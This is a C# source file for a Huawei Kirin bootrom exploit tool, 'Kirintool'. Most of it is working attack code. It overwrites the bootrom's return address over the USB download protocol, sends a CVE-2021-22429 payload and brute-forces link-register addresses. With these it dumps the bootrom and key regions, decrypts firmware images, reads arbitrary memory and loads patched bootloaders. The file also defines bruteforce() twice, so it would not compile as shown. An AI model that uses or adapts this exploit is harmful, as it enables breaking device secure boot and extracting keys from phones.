using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using KirinTool.ImageFlasher;
//using Potato.Fastboot;
using System.Security.Cryptography;
using System.IO;
using System.Linq;
using Microsoft.VisualBasic;
using System.ComponentModel;
using System.Runtime.Intrinsics.Arm;
using System.Collections;
using System.Diagnostics;
using System.Reflection.Emit;
using System.Drawing.Printing;
using Microsoft.Win32;
using System.Runtime.InteropServices;
namespace KirinTool1
{
    internal class Program
    {
        static int usbfused=0;
        static void execute()
        {
            if (usbfused == 0)
            {
                System.Threading.Thread.Sleep(2500);
                return;
            }
            //Console.WriteLine("Press any key to continue...(REPLUG)");
            //Console.ReadKey(true);
            //return;
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/c devcon restart \"USB\\VID_12D1&PID_3609\"";
            startInfo.UseShellExecute = false;
            startInfo.Verb = "runas";
            Process process = Process.Start(startInfo);
            process.WaitForExit();
            
        }
        static  Dictionary<string, int> socid = new Dictionary<string, int>
        {
            {"STOCK",0 },
            {"659",1 },
            {"710",2 },
            {"710F",2 },
            {"710A",2 },
            {"810",3 },
            {"980",4 },
            {"9904G",5 },
            {"9905G",6 },
            {"990E",6 },
            {"9805G",7 },
            {"820",7 },
            {"970",8 },
            {"960",9 },
            {"UNFUSED9000",10 }
        };
        private string autodetectport()
        {
            return "1";
        }
        static void bruteforce()
        {
            var dat = BitConverter.GetBytes(0x22001);
            //This is the xloader start  address(stored in 0x23018 where xloader image starts at 0x22000)
            // for old socs,it may be 0x23001
            //because of thumb code,you need to add 1 to your real address(0x23154+1)
            var dat1 = Convert.FromHexString("FEE700BF");//deadloop to test correct LR address
            //download_xloader 0x07ea
            var fl = new ImageFlasher();
            Console.WriteLine("-----Kirin Exploit Program Start-----\nTarget Platform is 9905G");
            // Console.WriteLine("Make sure xloader_710a.img fastboot_710a.img uce.img is in this directory.");
            Console.WriteLine("Make sure your device is connected,and then input your port name and press enter(e.g.COM12)\nThis Program is used for bruteforce bootrom LR address.");

            var portname = Console.ReadLine();
            fl.Open(portname);//your port name

            fl.SendHeadFrame(0, 0x22000);
            fl.SendTailFrame(1);
            fl.Close();
            execute();
            fl.Open(portname);
            Console.WriteLine("Bruteforce Bootrom address....");
            fl.SendHeadFrame(4, 0x22000);
            fl.SendDataFrame(1, dat1);
            //67a9c
            for (var i = 0x67a98; i >= 0x67000; i -= 4)
            {
                Console.WriteLine(i.ToString("X"));
                fl.SendHeadFrame(4, 0x22000);
                fl.SendHeadFrame(4, i);
                fl.SendDataFrame(1, dat);
                Console.WriteLine("OK!");
                fl.Close();
                execute();
                fl.Open(portname);
            }
        }
        static void test1()
        {
            var dat = BitConverter.GetBytes(0x22001);
            //This is the xloader start  address(stored in 0x23018 where xloader image starts at 0x22000)
            // for old socs,it may be 0x23001
            //because of thumb code,you need to add 1 to your real address(0x23154+1)
            //var dat1 = Convert.FromHexString("FEE700BF");
            //download_xloader 0x07ea
            //820 is 7d8
            var fl = new ImageFlasher();
            Console.WriteLine("-----Kirin Exploit Program Start-----\nTarget Platform is 9905G");
            // Console.WriteLine("Make sure xloader_710a.img fastboot_710a.img uce.img is in this directory.");
            Console.WriteLine("Make sure your device is connected,and then input your port name and press enter(e.g.COM12)\nThis Program is used for bruteforce bootrom LR address.");

            var portname = Console.ReadLine();
            fl.Open(portname);//your port name

            fl.SendInquiry(1);
            var buffer2 = new byte[4];
            fl.port.Read(buffer2, 0, 4);
            Console.WriteLine(BitConverter.ToString(buffer2).Replace("-", ""));
            Console.WriteLine("Get Download xloader address");
            fl.Write("payload_get_usb_addr", 0x22000, 0, x => Console.WriteLine($"Progress:{x}%"));
            fl.SendHeadFrame(4, 0x22000);
            fl.SendHeadFrame(4, 0x67328);
            fl.SendDataFrame(1, dat);

            fl.Close();
            execute();
            fl.Open(portname);
            Console.ReadKey(true);
            fl.SendInquiry(1);
            var buffer1 = new byte[4];
            fl.port.Read(buffer1, 0, 4);
            Console.WriteLine(BitConverter.ToString(buffer1).Replace("-", ""));
            fl.Close();
            Console.ReadKey(true);
        }
        static void dumpbrom(string names)
        {
            var dat = BitConverter.GetBytes(0x22001);
            //This is the xloader start  address(stored in 0x23018 where xloader image starts at 0x22000)
            // for old socs,it may be 0x23001
            //because of thumb code,you need to add 1 to your real address(0x23154+1)
            //var dat1 = Convert.FromHexString("FEE700BF");
            //download_xloader 0x07ea
            var fl = new ImageFlasher();
            Console.WriteLine("-----Kirin Exploit Program Start-----\nTarget Platform is 9905G");
            // Console.WriteLine("Make sure xloader_710a.img fastboot_710a.img uce.img is in this directory.");
            Console.WriteLine("Make sure your device is connected,and then input your port name and press enter(e.g.COM12)\nThis Program is used for dumping bootrom.");

            var portname = Console.ReadLine();
            fl.Open(portname);//your port name


            Console.WriteLine("Dump Brom Start");
            fl.Write("payload_dumpbrom", 0x22000, 0, x => Console.WriteLine($"Progress:{x}%"));

            FileStream fs = new FileStream(names, FileMode.Append, FileAccess.Write);
            for (var i = 0; i < 0x10000; i += 4)
            {
                fl.SendHeadFrame(4, 0x22000);
                fl.SendHeadFrame(4, 0x67328);
                fl.SendDataFrame(1, dat);
                fl.SendInquiry(1);
                var buffer1 = new byte[4];
                fl.port.Read(buffer1, 0, 4);
                fs.Write(buffer1, 0, buffer1.Length);
                if ((i + 1) % 0x1000 == 0)
                {
                    Console.WriteLine((100f * (i + 1) / 0x10000).ToString() + "%");
                }
            }
            //Console.WriteLine(BitConverter.ToString(buffer1).Replace("-", ""));
            fl.Close();
            fs.Close();
            Console.ReadKey(true);
        }
        static void dumpkeyregion(string names)
        {
            var dat = BitConverter.GetBytes(0x22001);
            //This is the xloader start  address(stored in 0x23018 where xloader image starts at 0x22000)
            // for old socs,it may be 0x23001
            //because of thumb code,you need to add 1 to your real address(0x23154+1)
            //var dat1 = Convert.FromHexString("FEE700BF");
            //download_xloader 0x07ea
            var fl = new ImageFlasher();
            Console.WriteLine("-----Kirin Exploit Program Start-----\nTarget Platform is 710A");
            // Console.WriteLine("Make sure xloader_710a.img fastboot_710a.img uce.img is in this directory.");
            Console.WriteLine("Make sure your device is connected,and then input your port name and press enter(e.g.COM12)\nThis Program is used for dumping special regions.");

            var portname = Console.ReadLine();
            fl.Open(portname);//your port name


            Console.WriteLine("Dump Start");
            fl.Write("D:\\adb tools\\bzh-w00\\exploit\\payload_dump_key_region", 0x22000, 0, x => Console.WriteLine($"Progress:{x}%"));

            FileStream fs = new FileStream(names, FileMode.Append, FileAccess.Write);
            for (var i = 0; i < 0x2000; i += 4)
            {
                fl.SendHeadFrame(4, 0x22000);
                fl.SendHeadFrame(4, 0x49b30);
                fl.SendDataFrame(1, dat);
                fl.SendInquiry(1);
                var buffer1 = new byte[4];
                fl.port.Read(buffer1, 0, 4);
                fs.Write(buffer1, 0, buffer1.Length);
                if ((i) % 0x400 == 0)
                {
                    Console.WriteLine((100f * (i) / 0x2000).ToString() + "%");
                }
            }
            //Console.WriteLine(BitConverter.ToString(buffer1).Replace("-", ""));
            fl.Close();
            fs.Close();
            Console.ReadKey(true);
        }
        static void decrypt_and_dump_xloader(string desc, string src)
        {
            var dat = BitConverter.GetBytes(0x4C001);
            var fl = new ImageFlasher();
            Console.WriteLine("-----Kirin Exploit Program Start-----\nTarget Platform is 810");
            Console.WriteLine("Make sure your device is connected,and then input your port name and press enter(e.g.COM12)\nThis Program is used for decrypting and dumping xloader.");
            var portname = Console.ReadLine();
            fl.Open(portname);//your port name
            Console.WriteLine("Decrypting xloader...");
            fl.Write(src, 0x22000, 0, x => Console.WriteLine($"Progress:{x}%"));
            fl.SendHeadFrame(98, 0x22000);
            fl.Write("payload_decrypt_xloader", 0x4C000, 0, x => Console.WriteLine($"Progress:{x}%"));

            fl.SendHeadFrame(4, 0x22000);
            fl.SendHeadFrame(4, 0x4dbC8);
            fl.SendDataFrame(1, dat);
            fl.SendTailFrame(2);
            //Console.ReadKey(true);
            Console.WriteLine("Decrypt OK!Start to dump!");
            fl.Close();
            execute();
            //Console.ReadKey(true);
            fl.Open(portname);
            fl.SendHeadFrame(94, 0x22000);
            //Console.ReadKey(true);
            fl.Write("payload_dump_xloader", 0x4C000, 0, x => Console.WriteLine($"Progress:{x}%"));
            FileStream fs2 = new FileStream(desc, FileMode.Append, FileAccess.Write);
            FileInfo fileInfo = new FileInfo(src);
            long siz_file = fileInfo.Length;
            Console.WriteLine("Xloader Size:" + siz_file);

            for (var i = 0; i < siz_file; i += 4)
            {
                fl.SendHeadFrame(4, 0x22000);//using head resend exploit,send right address
                fl.SendHeadFrame(4, 0x4db28);//send target address ,but the state machine does not change,
                                             //target address is the return address of download_xloader function

                fl.SendDataFrame(1, dat);



                fl.SendInquiry(1);
                var buffer2 = new byte[4];
                fl.port.Read(buffer2, 0, 4);
                fs2.Write(buffer2, 0, buffer2.Length);
                if ((i + 4) % 0x1000 == 0)
                {
                    Console.WriteLine((100f * (i + 4) / siz_file).ToString() + "%");
                }

            }
            fs2.Close();
            fl.Close();
            Console.WriteLine("Dump OK!File is " + desc);
            Console.ReadKey(true);
        }
        static void sendimage(string xloader, string uce, string fastboot, string bl2)
        {
            var dat = BitConverter.GetBytes(0x23155);
            var fl = new ImageFlasher();
            Console.WriteLine("-----Kirin Exploit Program Start-----\nTarget Platform is 995/820/985");
            Console.WriteLine("Make sure your device is connected,and then input your port name and press enter(e.g.COM12)\nThis Program is used for temporary unlocking bootloader.(This is only for loading test.)\nPlease Make sure xloader.img,uce.img,fastboot.img,bl2.img are in this directory. ");
            var portname = Console.ReadLine();
            fl.Open(portname);//your port name
            Console.WriteLine("Now re-init UFS/EMMC and reopen USB.");
            fl.SendHeadFrame(0, 0x22000);
            fl.SendTailFrame(1);
            fl.Close();
            execute();
            fl.Open(portname);

            Console.WriteLine("------Send Xloader-------------");
            fl.Write(xloader, 0x22000, 1, x => Console.WriteLine($"Progress:{x}%"));
            /*fl.SendHeadFrame(4, 0x22000);
            fl.SendHeadFrame(4, 0x673C8);
            fl.SendDataFrame(1, dat);
            fl.SendTailFrame(2);*/
            fl.Close();
            execute();
            fl.Open(portname);
            Console.WriteLine("------Send Uce-------------");
            fl.Write(uce, 0x60000000, 1, x => Console.WriteLine($"Progress:{x}%"));
            fl.Close();
            execute();
            fl.Open(portname);
            //Console.ReadKey(true);
            //System.Threading.Thread.Sleep(2000); 
            Console.WriteLine("------Send Fastboot-------------");
            fl.Write(fastboot, 0x1A400000, 1, x => Console.WriteLine($"Progress:{x}%"));
            //Console.ReadKey(true);
            fl.Close();
            execute();
            fl.Open(portname);
            //fl.Write(fastboot+".patched", 0x1A400000, 0, x => Console.WriteLine($"Progress:{x}%"));
            //Console.ReadKey(true);
            Console.WriteLine("------Send BL2-------------");
            fl.Write(bl2, 0x1E400000, 1, x => Console.WriteLine($"Progress:{x}%"));
            fl.Close();
            execute();
            //Console.ReadKey(true);
            Console.WriteLine("Successful!Replug USB and you will see fastboot devices on your computer.\nPress any key to exit.");
            Console.ReadKey(true);
        }
        static void sendimage5(string xloader, string uce, string fastboot, string bl2)
        {
            var dat = BitConverter.GetBytes(0x23155);
            var fl = new ImageFlasher();
            Console.WriteLine("-----Kirin Exploit Program Start-----\nTarget Platform is 995/820/985");
            Console.WriteLine("Make sure your device is connected,and then input your port name and press enter(e.g.COM12)\nThis Program is used for temporary unlocking bootloader.\nPlease Make sure xloader.img,uce.img,fastboot.img,bl2.img are in this directory. ");
            var portname = Console.ReadLine();
            fl.Open(portname);//your port name
            Console.WriteLine("Now re-init UFS/EMMC and reopen USB.");
            fl.SendHeadFrame(0, 0x22000);
            fl.SendTailFrame(1);
            fl.Close();
            execute();
            fl.Open(portname);

            Console.WriteLine("------Send Xloader-------------");
            fl.Write(xloader, 0x22000, 1, x => Console.WriteLine($"Progress:{x}%"));
            /*fl.SendHeadFrame(4, 0x22000);
            fl.SendHeadFrame(4, 0x673C8);
            fl.SendDataFrame(1, dat);
            fl.SendTailFrame(2);*/

            Console.WriteLine("------Send Uce-------------");
            fl.Write(uce, 0x60000000, 1, x => Console.WriteLine($"Progress:{x}%"));
            fl.Close();
            //execute();
            fl.Open(portname);
            //Console.ReadKey(true);
            //System.Threading.Thread.Sleep(2000); 
            Console.WriteLine("------Send Fastboot-------------");
            fl.Write(fastboot, 0x1A400000, 1, x => Console.WriteLine($"Progress:{x}%"));
            //Console.ReadKey(true);
            fl.Close();
            //execute();
            fl.Open(portname);
            fl.Write(fastboot + ".patched", 0x1A400000, 0, x => Console.WriteLine($"Progress:{x}%"));
            //Console.ReadKey(true);
            Console.WriteLine("------Send BL2-------------");
            fl.Write(bl2, 0x1E400000, 1, x => Console.WriteLine($"Progress:{x}%"));
            fl.Close();
            //execute();
            //Console.ReadKey(true);
            Console.WriteLine("Successful!Replug USB and you will see fastboot devices on your computer.\nPress any key to exit.");
            Console.ReadKey(true);
        }
        static void sendimage2(string xloader, string uce, string fastboot, string bl2)
        {
            var dat = BitConverter.GetBytes(0x49001);
            var fl = new ImageFlasher();
            Console.WriteLine("-----Kirin Exploit Program Start-----\nTarget Platform is 710A");
            Console.WriteLine("Make sure your device is connected,and then input your port name and press enter(e.g.COM12)\nThis Program is used for temporary unlocking bootloader.\nPlease Make sure xloader.img,uce.img,fastboot.img,bl2.img are in this directory. ");
            var portname = Console.ReadLine();
            fl.Open(portname);//your port name
            Console.WriteLine("Now re-init UFS/EMMC and reopen USB.");
            fl.SendHeadFrame(0, 0x22000);
            fl.SendTailFrame(1);
            fl.Close();
            Thread.Sleep(3000);
            fl.Open(portname);

            Console.WriteLine("------Send Xloader-------------");
            fl.Write(xloader, 0x22000, 0, x => Console.WriteLine($"Progress:{x}%"));
            fl.SendHeadFrame(18, 0x22000);
            fl.Write("D:\\adb tools\\bzh-w00\\exploit\\payload_change_boot_mode", 0x49000, 0, x => Console.WriteLine($"Progress:{x}%"));
            fl.SendHeadFrame(4, 0x22000);
            fl.SendHeadFrame(4, 0x49bC8);
            fl.SendDataFrame(1, dat);
            fl.SendTailFrame(2);

            Console.WriteLine("------Send Uce-------------");
            fl.Write(uce, 0x6000D000, 1, x => Console.WriteLine($"Progress:{x}%"));
            //Console.ReadKey(true);
            //System.Threading.Thread.Sleep(2000); // 延迟1000毫秒（1秒）
            fl.Close();
            Thread.Sleep(2000);
            fl.Open(portname);
            Console.WriteLine("------Send Fastboot-------------");
            fl.Write(fastboot, 0x1C000000, 1, x => Console.WriteLine($"Progress:{x}%"));
            fl.Close();



            //Console.ReadKey(true);
            Console.WriteLine("Successful!Replug USB and you will see fastboot devices on your computer.\nPress any key to exit.");
            Console.ReadKey(true);
        }
        static void sendimage3(string xloader, string uce, string fastboot, string bl2)
        {
            var dat = BitConverter.GetBytes(0x49001);
            var fl = new ImageFlasher();

            Console.WriteLine("-----Kirin Exploit Program Start-----\nTarget Platform is 995/820/985");
            Console.WriteLine("Make sure your device is connected,and then input your port name and press enter(e.g.COM12)\nThis Program is used for temporary unlocking bootloader.\nPlease Make sure xloader.img,uce.img,fastboot.img,bl2.img are in this directory. ");
            var portname = Console.ReadLine();
            fl.Open(portname);//your port name
            Console.WriteLine("Now re-init UFS/EMMC and reopen USB.");
            fl.SendHeadFrame(0, 0x22000);
            fl.SendTailFrame(1);
            fl.Close();
            Thread.Sleep(3000);
            fl.Open(portname);

            Console.WriteLine("------Send Xloader-------------");
            fl.SendHeadFrame(0x2A000, 0x22000);
            fl.Write(xloader, 0x22000, 0, x => Console.WriteLine($"Progress:{x}%"), 0);
            FileInfo fileInfo = new FileInfo(xloader);
            long siz_file = fileInfo.Length;
            var cdata = new byte[0x400];
            for (int i = 0; i < 0x400; ++i)
            {
                cdata[i] = 0;
            }
            int j = (int)siz_file / 0x400 + 1;
            Console.WriteLine((siz_file));
            Console.WriteLine((j));

            for (long i = 0x22000 + siz_file; i < 0x49000; i += 0x400, j++)
            {
                fl.SendTailFrame(j);
            }


            fl.Write("D:\\adb tools\\bzh-w00\\exploit\\payload_recover_usb", 0x49000, 0, x => Console.WriteLine($"Progress:{x}%"), 0, 1, j - 1);
            j++;
            fl.SendTailFrame(j);
            Console.WriteLine("Start to overwrite...");
            List<byte> addrdata = new List<byte>();
            for (int i = 0; i < 0x400; i += 4)
            {
                addrdata.AddRange(dat);
            }
            fl.SendDataFrame2(j + 1, addrdata.ToArray());
            Console.ReadKey(true);
            fl.SendHeadFrame(0, 0x22000);

            fl.SendTailFrame(1);

            Console.WriteLine("------Send Uce-------------");
            fl.Write(uce, 0x6000D000, 1, x => Console.WriteLine($"Progress:{x}%"));
            //Console.ReadKey(true);
            //System.Threading.Thread.Sleep(2000); // 延迟1000毫秒（1秒）
            fl.Close();
            Thread.Sleep(2000);
            fl.Open(portname);
            Console.WriteLine("------Send Fastboot-------------");
            fl.Write(fastboot, 0x1C000000, 1, x => Console.WriteLine($"Progress:{x}%"));
            fl.Close();



            //Console.ReadKey(true);
            Console.WriteLine("Successful!Replug USB and you will see fastboot devices on your computer.\nPress any key to exit.");
            Console.ReadKey(true);
        }
        static void sendimage4(string xloader, string uce, string fastboot, string bl2)  //CVE-2021-22429
        {
            var dat = BitConverter.GetBytes(0x23155);
            var fl = new ImageFlasher();

            Console.WriteLine("-----Kirin Exploit Program Start-----\nTarget Platform is 985/820");
            Console.WriteLine("Make sure your device is connected,and then input your port name and press enter(e.g.COM12)\nThis Program is used for temporary unlocking bootloader.\nPlease Make sure xloader.img,uce.img,fastboot.img,bl2.img are in this directory. ");
            var portname = Console.ReadLine();
            fl.Open(portname);//your port name
            Console.WriteLine("Now re-init UFS/EMMC and reopen USB.");
            fl.SendHeadFrame(0, 0x22000);
            fl.SendTailFrame(1);
            fl.Close();
            execute();
            fl.Open(portname);
            Console.WriteLine("------Send Xloader-------------");
            fl.Write(xloader, 0x22000, 0, x => Console.WriteLine($"Progress:{x}%"));
            var stream = new FileStream("payload_22429", FileMode.Open, FileAccess.Read);
            var length = (int)stream.Length;
            var buf1 = new byte[0x640];
            stream.Read(buf1, 0, length);

            Console.WriteLine("------Send Payload1-------------");
            fl.SendHeadFrame(0x400C8, 0x22000);





            List<byte> addrdata = new List<byte>();
            addrdata.AddRange(buf1);

            Console.WriteLine(addrdata.ToArray().Length);
            try
            {
                fl.port.Write(addrdata.ToArray(), 0, 0x640);
                fl.port.ReadByte();
                fl.port.DiscardInBuffer();
                fl.port.DiscardOutBuffer();
            }
            catch
            {
                Console.WriteLine("Exception!Not An Error!");
            }
            Thread.Sleep(500);
            List<byte> addrdata2 = new List<byte>();
            for (int i = 0; i < 0x400; i += 4)
            {
                addrdata2.AddRange(dat);
            }
            int jj = 1;
            fl.SendDataFrame(1, addrdata2.ToArray());
            fl.SendDataFrame(1, addrdata2.ToArray());
            //fl.SendDataFrame(1, dat);

            fl.SendTailFrame(2);


            Console.WriteLine("------Send Uce-------------");
            fl.Write(uce, 0x60000000, 1, x => Console.WriteLine($"Progress:{x}%"));
            //Console.ReadKey(true);
            //System.Threading.Thread.Sleep(2000); // 延迟1000毫秒（1秒）
            fl.Close();
            execute();
            fl.Open(portname);
            Console.WriteLine("------Send Fastboot-------------");
            fl.Write(fastboot, 0x1A400000, 1, x => Console.WriteLine($"Progress:{x}%"));
            fl.Close();
            execute();
            fl.Open(portname);
            Console.WriteLine("------Send BL2-------------");
            fl.Write(bl2, 0x1E400000, 1, x => Console.WriteLine($"Progress:{x}%"));
            fl.Close();
            execute();

            //Console.ReadKey(true);
            Console.WriteLine("Successful!Replug USB and you will see fastboot devices on your computer.\nPress any key to exit.");
            Console.ReadKey(true);
        }
        static void decrypt_and_dump_other(string xloader, string uce, string fastboot, string bl2)
        {
            var dat = BitConverter.GetBytes(0x23155);
            var fl = new ImageFlasher();
            Console.WriteLine("-----Kirin Exploit Program Start-----\nTarget Platform is 710A");
            Console.WriteLine("Make sure your device is connected,and then input your port name and press enter(e.g.COM12)\nThis Program is used for temporary unlocking bootloader.\nPlease Make sure xloader.img,uce.img,fastboot.img,bl2.img are in this directory. ");
            var portname = Console.ReadLine();
            fl.Open(portname);//your port name
            Console.WriteLine("Now re-init UFS/EMMC and reopen USB.");
            fl.SendHeadFrame(0, 0x22000);
            fl.SendTailFrame(1);
            fl.Close();
            Thread.Sleep(3000);
            fl.Open(portname);

            Console.WriteLine("------Send Xloader-------------");
            fl.Write(xloader, 0x22000, 0, x => Console.WriteLine($"Progress:{x}%"));
            fl.SendHeadFrame(4, 0x22000);
            fl.SendHeadFrame(4, 0x49bc8);
            fl.SendDataFrame(1, dat);
            fl.SendTailFrame(2);

            Console.WriteLine("------Send Uce-------------");
            fl.Write(uce, 0x6000D000, 1, x => Console.WriteLine($"Progress:{x}%"));
            //Console.ReadKey(true);
            fl.Close();
            Thread.Sleep(3000);
            fl.Open(portname);
            //System.Threading.Thread.Sleep(2000); // 延迟1000毫秒（1秒）
            Console.WriteLine("------Send Fastboot-------------");
            fl.Write(fastboot, 0x1c000000, 1, x => Console.WriteLine($"Progress:{x}%"));
            fl.Close();
            Thread.Sleep(3000);
            fl.Open(portname);
            //Console.ReadKey(true);


            Console.WriteLine("Decrypting FASTBOOT...");
            var src = fastboot;
            FileInfo fileInfo2 = new FileInfo(src);
            var siz_file = fileInfo2.Length;
            Console.WriteLine("Fastboot Size:" + siz_file);
            if (siz_file % 0x400 != 0)
            {
                siz_file = siz_file - siz_file % 0x400 + 0x400;
            }
            //siz_file *= 2;
            var stream2 = new FileStream(fastboot.Split('.')[0] + "_dec.img", FileMode.Append, FileAccess.Write);
            var buffer2 = new byte[0x400];
            for (var i = 0x1c000000; i < 0x1c000000 + siz_file; i += 0x400)
            {
                fl.SendInquiryPatched(2, i);
                fl.port.Read(buffer2, 0, 0x400);
                stream2.Write(buffer2, 0, 0x400);
                if ((i - 0x1c000000) % 0x40000 == 0)
                    Console.WriteLine((100f * (i - 0x1c000000) / siz_file).ToString() + "%");
            }
            stream2.Close();
            Console.WriteLine("FASTBOOT decrypt OK!");
            fl.Close();
            return;
            Console.WriteLine("Decrypting BL2...");
            src = bl2;
            FileInfo fileInfo3 = new FileInfo(src);
            siz_file = fileInfo3.Length;
            Console.WriteLine("Bl2 Size:" + siz_file);
            if (siz_file % 0x400 != 0)
            {
                siz_file = siz_file - siz_file % 0x400 + 0x400;
            }
            var stream3 = new FileStream(bl2.Split('.')[0] + "_dec.img", FileMode.Append, FileAccess.Write);
            var buffer3 = new byte[0x400];
            for (var i = 0x1E400000; i < 0x1E400000 + siz_file; i += 0x400)
            {
                fl.SendInquiryPatched(2, i);
                fl.port.Read(buffer3, 0, 0x400);
                stream3.Write(buffer3, 0, 0x400);
                if ((i - 0x1E400000) % 0x40000 == 0)
                    Console.WriteLine((100f * (i - 0x1E400000) / siz_file).ToString() + "%");
            }
            stream3.Close();
            Console.WriteLine("BL2 decrypt OK!");
            fl.Close();
            //Console.ReadKey(true);
            Console.WriteLine("All decrypt successfully!\nPress any key to exit.");
            Console.ReadKey(true);
        }
        static void read_mem(string xloader, int addr, int siz, string path)
        {
            var dat = BitConverter.GetBytes(0x23155);
            var fl = new ImageFlasher();
            Console.WriteLine("-----Kirin Exploit Program Start-----\nTarget Platform is 710A");
            Console.WriteLine("Make sure your device is connected,and then input your port name and press enter(e.g.COM12)\nThis Program is used for temporary unlocking bootloader.\nPlease Make sure xloader.img,uce.img,fastboot.img,bl2.img are in this directory. ");
            var portname = Console.ReadLine();
            fl.Open(portname);//your port name
            Console.WriteLine("Now re-init UFS/EMMC and reopen USB.");
            fl.SendHeadFrame(0, 0x22000);
            fl.SendTailFrame(1);
            fl.Close();
            Thread.Sleep(3000);
            fl.Open(portname);

            Console.WriteLine("------Send Xloader-------------");
            fl.Write(xloader, 0x22000, 0, x => Console.WriteLine($"Progress:{x}%"));
            fl.SendHeadFrame(4, 0x22000);
            fl.SendHeadFrame(4, 0x49bc8);
            fl.SendDataFrame(1, dat);
            fl.SendTailFrame(2);
            var stream2 = new FileStream(path, FileMode.Append, FileAccess.Write);
            var buffer2 = new byte[0x400];
            for (var i = 0; i < siz; i += 0x400)
            {
                fl.SendInquiryPatched(2, addr + i);
                fl.port.Read(buffer2, 0, 0x400);
                stream2.Write(buffer2, 0, 0x400);
                if (i % 0x4000 == 0)
                    Console.WriteLine((100f * (i) / siz).ToString() + "%");
            }
            stream2.Close();
            Console.WriteLine("Saved to " + path);
            fl.Close();
            return;
        }
        static void bruteforce()
        {
            var dat = BitConverter.GetBytes(0x22001);
            //This is the xloader start  address(stored in 0x23018 where xloader image starts at 0x22000)
            // for old socs,it may be 0x23001
            //because of thumb code,you need to add 1 to your real address(0x23154+1)
            var dat1 = Convert.FromHexString("FEE700BF");//an infinite loop 
            //download_xloader 0x07ea
            
            var fl = new ImageFlasher();
            Console.WriteLine("-----Kirin Exploit Program Start-----\nTarget Platform is 9905G");
            // Console.WriteLine("Make sure xloader_710a.img fastboot_710a.img uce.img is in this directory.");
            Console.WriteLine("Make sure your device is connected,and then input your port name and press enter(e.g.COM12)\nThis Program is used for bruteforce bootrom LR address.");

            var portname = Console.ReadLine();
            fl.Open(portname);//your port name

            fl.SendHeadFrame(0, 0x22000);
            fl.SendTailFrame(1);
            fl.Close();
            execute();
            fl.Open(portname);
            Console.WriteLine("Bruteforce Bootrom address....");
            fl.SendHeadFrame(4, 0x22000);
            fl.SendDataFrame(1, dat1);
            //67a9c
            for (var i = 0x67a98; i >= 0x67000; i -= 4)
            {
                Console.WriteLine(i.ToString("X"));
                fl.SendHeadFrame(4, 0x22000);
                fl.SendHeadFrame(4, i);
                fl.SendDataFrame(1, dat);
                Console.WriteLine("OK!");
                fl.Close();
                execute();
                fl.Open(portname);
            }
        }
        
        static void Main(string[] args)
        {
            Console.WriteLine("Kirintool Program Public (c) Hicode002 2025");
            Console.WriteLine("Select Platform and then press enter(STOCK does not run any exploit)\n659 710 710F 710A 970 960 980 9904G 9905G 810 820 9805G 990E UNFUSED9000 STOCK");
            
            string platformstr ;
            if (args.Length < 1)
            {
                platformstr = Console.ReadLine();
            }
            else
            {
                platformstr = args[0];
                Console.WriteLine("No need to input,get platform from arguments.");
            }
            
            int platid = socid[platformstr];
            Console.WriteLine("Selected platform " + platformstr + " , id = "+platid.ToString());
            
            if (platid == 0)
            {
                Console.WriteLine("Supported functions: stockload,provide images");

            }
            
        }
    }
}